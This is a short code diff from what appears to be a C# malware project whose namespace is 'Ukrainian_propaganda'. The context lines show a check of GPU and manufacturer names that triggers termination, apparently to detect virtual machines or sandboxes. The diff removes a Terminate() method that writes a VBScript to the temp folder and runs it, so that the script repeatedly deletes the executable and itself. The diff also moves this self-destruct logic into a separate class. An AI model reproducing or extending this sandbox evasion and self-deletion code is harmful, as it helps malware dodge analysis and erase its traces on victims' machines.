@@ -2,6 +2,7 @@
 using System.IO;
 using System.Reflection;
 using static Ukrainian_propaganda.SystemInfo;
+using static Ukrainian_propaganda.SelfDestruct;
 
 namespace Ukrainian_propaganda
 {
@@ -36,16 +37,8 @@ namespace Ukrainian_propaganda
                 if (gpu.Contains(name) || manufacturer.Contains(name))
                 {
                     Terminate();
-                    Environment.Exit(0);
                 }
             }
-        }
-
-        public static void Terminate()
-        {
-            string Body = "Set fso = CreateObject(\"Scripting.FileSystemObject\"): On error resume next: Dim I: I = 0" + Environment.NewLine + "Set File = FSO.GetFile(\"" + ExecutablePath + "\"): Do while I = 0: fso.DeleteFile (\"" + ExecutablePath + "\"): fso.DeleteFile (\"" + TempPath + "\\1.vbs\"): " + Environment.NewLine + "If FSO.FileExists(File) = false Then: I = 1: End If: Loop";
-            File.WriteAllText(TempPath + "\\1.vbs", Body, System.Text.Encoding.Default);
-            System.Diagnostics.Process.Start(TempPath + "\\1.vbs");
         }
     }
 }
